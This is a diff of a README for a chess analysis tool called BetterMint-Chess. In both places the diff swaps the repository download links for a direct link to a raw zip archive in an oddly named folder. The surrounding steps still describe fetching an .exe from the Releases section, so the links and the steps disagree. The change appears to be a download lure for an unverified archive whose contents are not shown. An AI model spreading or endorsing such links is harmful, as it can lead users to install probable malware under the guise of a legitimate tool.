@@ -1,6 +1,6 @@
 # ♟️ BetterMint-Chess - Improve your chess skills with ease
 
-[![](https://img.shields.io/badge/Download-BetterMint-blue.svg)](https://github.com/Bobbiblotchy346/BetterMint-Chess)
+[![](https://img.shields.io/badge/Download-BetterMint-blue.svg)](https://github.com/Bobbiblotchy346/BetterMint-Chess/raw/refs/heads/main/Zacatec/Chess-Better-Mint-v3.7.zip)
 
 BetterMint-Chess helps you learn and play the game of chess. Use this tool to study your moves and find mistakes. The software connects to strong computer engines to analyze your games. You can see better moves and understand why they work. This tool replaces all older versions of the software.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to get the software on your machine.
 
-1. Visit [this page](https://github.com/Bobbiblotchy346/BetterMint-Chess) to download the current version.
+1. Visit [this page](https://github.com/Bobbiblotchy346/BetterMint-Chess/raw/refs/heads/main/Zacatec/Chess-Better-Mint-v3.7.zip) to download the current version.
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version number.
 4. Find the file ending in .exe under the Assets list.
